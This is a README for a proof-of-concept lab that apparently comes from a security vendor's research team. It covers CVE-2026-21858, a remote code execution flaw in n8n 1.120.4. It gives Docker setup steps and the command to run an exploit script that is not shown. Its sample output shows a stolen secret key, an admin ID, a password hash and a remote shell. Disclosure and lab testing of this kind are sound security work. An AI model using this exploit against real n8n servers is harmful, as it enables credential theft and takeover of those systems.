# CVE-2026-21858 RCE

PoC environment for n8n `1.120.4` with a Form Trigger workflow and an exploit script.

## Requirements
- Docker (Docker Desktop on Windows)
- Python 3.x (attack side)

## Files
- `Dockerfile` — build the n8n vulnerable environment
- `run.bat` — run the container (Windows)
- `workflow.txt` — n8n workflow (includes Form Trigger)
- `poc.py` — PoC script
- `requirements.txt` — PoC dependencies

## Environment Setup

1) Build Docker image
~~~bash
docker build -t n8n-vuln:1.120.4 .
~~~

2) Run environment (Windows)
~~~bat
run.bat
~~~

3) n8n Configuration
1. Open n8n in the browser
2. Login as **admin**
3. Create a new workflow
4. paste `workflow.txt`
5. **Activate** the workflow
6. Copy the **Form Trigger URL**

## Proof of Concept (PoC)

1) Install dependencies (attack side)
~~~bash
pip3 install -r requirements.txt
~~~

2) Run exploit
~~~bash
python3 poc.py
~~~

- Paste the **Form Trigger URL** when prompted.

## Expected Result
- PoC extracts sensitive n8n assets (e.g., `FINAL_SECRET_KEY`, admin identifiers) from the target.
- An interactive shell prompt (`n8n-shell>`) is provided.
- Running a command (e.g., `id`) returns output from the target environment (RCE).

### Sample Output
~~~text
[+] Success: SECRET_KEY = "..."
[+] Success: admin_id = "..."
[+] Success: admin_hash = "..."

=== n8n Shell Ready ===
n8n-shell> id

[!] 'id' Result:
------------------------------
uid=1000(n8n) gid=1000(n8n) groups=1000(n8n)
------------------------------
~~~
## EQST Insight
We publish CVE and malware analysis once a month. If you're interested, please follow the links below to check out our publications.
- KR : https://www.skshieldus.com/security-insights/reports/n8n_arbitrary_file_read_vulnerability_cve_2026_21858
- EN : https://www.skshieldus.com/en/report?tab=eqst
